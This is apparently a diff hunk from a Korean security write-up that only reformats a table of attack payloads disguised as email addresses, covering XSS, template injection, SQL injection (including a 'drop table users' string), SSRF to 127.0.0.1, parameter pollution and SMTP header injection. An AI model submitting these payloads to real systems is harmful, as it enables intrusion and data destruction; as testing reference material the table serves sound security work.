@@ -146,19 +146,19 @@ Local-Part 부분에서 “ 가 사용가능하다면 SMTP Injection 의 파급�
 
 | Vulnerability                  | Payload                                                      |
 |--------------------------------|--------------------------------------------------------------|
-| XSS                            | \`test+(\<script>alert(1)\</script>)@example.com\`           |
-|                                | \`test@example(\<script>alert(1)\</script>.com\`             |
-|                                | \`"\<script>alert(1)\</script>"@example.com\`                |
-| Template Injection (SSTI)      | \`"<%=7*7%>"@example.com\`                                   |
-|                                | \`test+(${{7*7}})@example.com\`                              |
-| SQL Injection                  | \`"' or 1=1 --'"@example.com\`                               |
-|                                | \`"mail'); drop table users;--"@example.com\`                |
-| SSRF                           | \`trust@abc123.interserver\`                                 |
-|                                | \`trust@[127.0.0.1]\`                                        |
-| Parameter Pollution            | \`victim&email=attacker@example.com\`                        |
-| (Email) SMTP Header Injection  | \`"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com\`       |
-|                                | \`"recipient@test.com>\r\nRCPT TO:<victim+"@test.com\`       |
-| Wildcard abuse                 | \`%@example.com\`                                            |
+| XSS                            | test+(\<script>alert(1)\</script>)@example.com           |
+|                                | test@example(\<script>alert(1)\</script>.com             |
+|                                | "\<script>alert(1)\</script>"@example.com                |
+| Template Injection (SSTI)      | "<%=7*7%>"@example.com                                   |
+|                                | test+(${{7*7}})@example.com                              |
+| SQL Injection                  | "' or 1=1 --'"@example.com                               |
+|                                | "mail'); drop table users;--"@example.com                |
+| SSRF                           | trust@abc123.interserver                                 |
+|                                | trust@[127.0.0.1]                                        |
+| Parameter Pollution            | victim&email=attacker@example.com                        |
+| (Email) SMTP Header Injection  | "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com       |
+|                                | "recipient@test.com>\r\nRCPT TO:<victim+"@test.com       |
+| Wildcard abuse                 | %@example.com                                            |
 
 
 
